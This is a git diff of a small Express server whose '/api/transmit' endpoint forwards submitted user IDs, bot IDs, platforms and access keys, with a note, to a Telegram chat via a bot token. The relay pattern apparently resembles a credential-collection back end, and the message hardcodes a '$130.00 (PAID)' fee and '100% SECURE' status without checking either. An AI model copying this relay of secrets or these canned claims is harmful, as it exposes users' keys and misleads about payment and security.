@@ -5,21 +5,23 @@ require('dotenv').config();
 
 const app = express();
 app.use(express.json());
-app.use(express.static(path.join(__dirname)));
 
-// Mission: Streamlined Access Management API
+// Main Handshake API
 app.post('/api/transmit', async (req, res) => {
-    const { userId, botId, platform, key } = req.body;
+    const { userId, botId, platform, key, note } = req.body;
     
     const message = `
-🛡️ *HGT NEXUS ACTIVATION*
+⚡ *HGT NEXUS: ACTIVATION VERIFIED*
 ────────────────
-👤 ID: \`${userId}\`
-🤖 BOT: \`${botId}\`
-📡 PLATFORM: \`${platform}\`
-🔑 KEY: \`${key}\`
+👤 USER ID: \`${userId}\`
+🤖 BOT ID: \`${botId}\`
+📡 VECTOR: \`${platform}\`
+🔑 ACCESS: \`${key}\`
 ────────────────
-*SYSTEM INTEGRITY VERIFIED*`;
+💰 FEE: $130.00 (PAID)
+📝 NOTE: ${note || 'N/A'}
+────────────────
+*SYSTEM INTEGRITY: 100% SECURE*`;
 
     try {
         await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
@@ -27,12 +29,12 @@ app.post('/api/transmit', async (req, res) => {
             text: message,
             parse_mode: 'Markdown'
         });
-        res.status(200).json({ status: 'Success' });
+        res.status(200).json({ success: true, status: 'Handshake_Complete' });
     } catch (err) {
-        console.error("[HGT-ERR]", err.message);
-        res.status(500).json({ status: 'Handshake Failed' });
+        console.error("Transmission Error:", err.message);
+        res.status(500).json({ success: false, status: 'Handshake_Failed' });
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[HACYBER] Nexus Core Online on Port ${PORT}`));
+app.listen(PORT, () => console.log(`Hacyber Nexus Core Online`));
